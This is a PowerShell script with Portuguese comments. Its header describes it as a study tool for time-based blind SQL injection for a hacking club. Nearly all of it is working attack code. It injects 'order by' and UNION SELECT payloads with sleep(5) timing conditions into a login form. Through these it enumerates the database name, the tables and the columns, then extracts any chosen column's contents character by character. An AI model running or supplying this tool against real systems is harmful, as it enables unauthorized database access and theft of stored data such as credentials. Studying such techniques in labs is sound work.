#=====================================================================================================#
# Descrição: Script básico em powershell destinado ao estudo de SQLi Time Based Blind. (Hacking Club) #
# Desenvolvido por: Ivan Barbosa Kovalinkinas                                                         #
# Versão: 1.0.0 Beta                                                                                  #
# Data: 16/11/2024                                                                                    #
#=====================================================================================================#
$server = 'X.P.T.O' # INFORMAR IP DO SERVIDOR

# Indentifica a quantidade de colunas para montar a query UNION SELECT
$qtdColumns = $null

for ($i = 1; $i -le 9999; $i++) {
    
    $bodyRequest = "username=' or 1=1 order by $($i); #&password=1"
    [bool]$validacao = ((Invoke-WebRequest -Method Post -Uri $server -Body $bodyRequest).Content -like "*Username or password is invalid!*")
     
    if( $validacao ){
        [int]$qtdColumns = ($i -1)
        break
    }
}

Clear-Host
Write-Output "`r`n################################################################################r`n`r`n Quantidade de colunas detectada: $($qtdColumns)`r`n`r`n################################################################################r`n"

[string]$unionSelect ="username=' union select "
for ($i = 1; $i -lt $qtdColumns; $i++) { $unionSelect += "$($i)," }

# Defini um estrutura de caracteres (0..9, a..z, _)
$asciiChars = @()
for ($i = 48; $i -le 57; $i++) { $asciiChars += [char]$i }
for ($i = 97; $i -le 122; $i++) { $asciiChars += [char]$i }
$asciiChars += [char]95

# Identifica o nome do banco de dados
$compara = $null
while ($true) {
    $asciiChars | ForEach-Object{
        $startRequest = Get-Date

        $bodyRequest = "$($unionSelect)if(substring((select database()),1,$($compara.Length+1))='$($compara)$($_)',sleep(5),NULL) -- -&password=1"
        Invoke-WebRequest -Method Post -Uri $server -Body $bodyRequest | Out-Null
        
        $endRequest = Get-Date
        $timeRequest = $(($endRequest - $startRequest).Seconds)

        if ( $timeRequest -ge 5 ) {
            [string]$compara += $_
            Clear-Host
            Write-Output "`r`n################################################################################r`n`r`n Quantidade de colunas detectada: $($qtdColumns)`r`n"
            Write-Output " Nome do banco de Dados: $($compara)`r`n`r`n############################################################"

            continue
        }
    }
    break
}
$dbName = $compara

# Identifica o nome das tabelas
$compara = $null
$tables = New-Object System.Collections.ArrayList
$i = 0
while ($true) {
    $newRun = $false

    $asciiChars | ForEach-Object{
        $startRequest = Get-Date

        $bodyRequest = "$($unionSelect)if(substring((select table_name from information_schema.tables where table_schema='$($dbName)' limit $($i),1),1,$($compara.Length+1))='$($compara)$($_)',sleep(5),NULL) -- -&password=1"
        Invoke-WebRequest -Method Post -Uri $server -Body $bodyRequest | Out-Null
        
        $endRequest = Get-Date
        $timeRequest = $(($endRequest - $startRequest).Seconds)

        if ( $timeRequest -ge 5 ) {
            [string]$compara += $_
            Clear-Host
            Write-Output "`r`n################################################################################r`n`r`n Quantidade de colunas detectada: $($qtdColumns)`r`n"
            Write-Output " Nome do banco de Dados: $($dbName)`r`n"
            Write-Output " Nome das Tabelas: $($compara)`r`n`r`n############################################################"
            $newRun = $true
            continue
        }
    }
    $tables.Add($compara) | Out-Null

    if (-not($newRun) -and ($compara -eq "") ) { break }
    
    $i++
    $compara = $null
}

Clear-Host
Write-Output "`r`n################################################################################r`n`r`n Quantidade de colunas detectada: $($qtdColumns)`r`n"
Write-Output " Nome do banco de Dados: $($dbName)`r`n"
Write-Output " Nome das Tabelas: $($tables -join ' | ')`r`n`r`n############################################################"

# Identifica o nome das colunas
$columns = New-Object System.Collections.ArrayList
$compara = $null
$i = 0
for ($x = 0; $x -le $($tables.Count - 1); $X++) {

    while ($true) {
        $newRun = $false
    
        $asciiChars | ForEach-Object{
            $startRequest = Get-Date
    
            $bodyRequest = "$($unionSelect)if(substring((select column_name from information_schema.columns where table_name='$($tables[$x])' and table_schema='$($dbName)' limit $($i),1),1,$($compara.Length+1))='$($compara)$($_)',sleep(5),NULL) -- -&password=1"
            Invoke-WebRequest -Method Post -Uri $server -Body $bodyRequest | Out-Null
            
            $endRequest = Get-Date
            $timeRequest = $(($endRequest - $startRequest).Seconds)
    
            if ( $timeRequest -ge 5 ) {
                [string]$compara += $_
                Clear-Host
                Write-Output "`r`n################################################################################r`n`r`n Quantidade de colunas detectada: $($qtdColumns)`r`n"
                Write-Output " Nome do banco de Dados: $($dbName)`r`n"
                Write-Output " Nome das Tabelas: $($tables -join ' | ')`r`n"
                Write-Output " Nome das Colunas: $($compara)`r`n`r`n############################################################"
                $newRun = $true
                continue
            }
        }
        $columns.Add($compara) | Out-Null
    
        if (-not($newRun) -and ($compara -eq "") ) { break }
        
        $i++
        $compara = $null
    }
}

Clear-Host
Write-Output "`r`n################################################################################r`n`r`n Quantidade de colunas detectada: $($qtdColumns)`r`n"
Write-Output " Nome do banco de Dados: $($dbName)`r`n"
Write-Output " Nome das Tabelas: $($tables -join ' | ')`r`n"
Write-Output " Nome das Colunas: $($columns -join ' | ')`r`n`r`n############################################################"

# Adiciona na estrutura de caracteres (@, A..Z)
$asciiChars += [char]64 # @
for ($i = 65; $i -le 90; $i++) { $asciiChars += [char]$i }

# função para efetuar consulta na tabela informada
function Check-Info{
    param (
        [string]$checlTable,
        [string]$checkColumn
    )

    Clear-Host
    Write-Output "`r`n################################################################################r`n`r`n Quantidade de colunas detectada: $($qtdColumns)`r`n"
    Write-Output " Nome do banco de Dados: $($dbName)`r`n"
    Write-Output " Nome das Tabelas: $($tables -join ' | ')`r`n"
    Write-Output " Nome das Colunas: $($columns -join ' | ')`r`n`r`n############################################################"

    $arrayList = New-Object System.Collections.ArrayList
    $compara = $null
    $i = 0
    while ($true) {
        $newRun = $false

        $asciiChars | ForEach-Object{
            $startRequest = Get-Date

            $bodyRequest = "$($unionSelect)if(substring((select $($checkColumn) from $($checlTable) limit $($i),1),1,$($compara.Length+1))='$($compara)$($_)',sleep(5),NULL) -- -&password=1"
            Invoke-WebRequest -Method Post -Uri $server -Body $bodyRequest | Out-Null

            $endRequest = Get-Date
            $timeRequest = $(($endRequest - $startRequest).Seconds)

            if ( $timeRequest -ge 5 ) {
                [string]$compara += $_
                Clear-Host
                Write-Output "`r`n################################################################################r`n`r`n Quantidade de colunas detectada: $($qtdColumns)`r`n"
                Write-Output " Nome do banco de Dados: $($dbName)`r`n"
                Write-Output " Nome das Tabelas: $($tables -join ' | ')`r`n"
                Write-Output " Nome das Colunas: $($columns -join ' | ')`r`n"
                Write-Output " Infomações contidas em $($checkColumn): $($compara)`r`n`r`n################################################################################r`n"
                $newRun = $true
                continue
            }
        }
        $arrayList.Add($compara) | Out-Null

        if (-not($newRun) -and ($compara -eq "") ) { break }

        $i++
        $compara = $null
    }

    Clear-Host
    Write-Output "`r`n################################################################################r`n`r`n Quantidade de colunas detectada: $($qtdColumns)`r`n"
    Write-Output " Nome do banco de Dados: $($dbName)`r`n"
    Write-Output " Nome das Tabelas: $($tables -join ' | ')`r`n"
    Write-Output " Nome das Colunas: $($columns -join ' | ')`r`n"
    Write-Output " Infomações contidas em $($checkColumn): $($arrayList -join " | ") `r`n################################################################################`r`n"

}

# loop para efetuar as consultas desejadas
while ($true) {

    $checlTable = Read-Host -Prompt "Qual tabela deseja verificar?"
    $checkColumn = Read-Host -Prompt "Qual coluna deseja verificar?"

    Check-Info -checlTable $checlTable -checkColumn $checkColumn

    $terminar = Read-Host -Prompt "Para encerrar digite ""fim: """

    if( $terminar -eq "fim" ){ break }
}
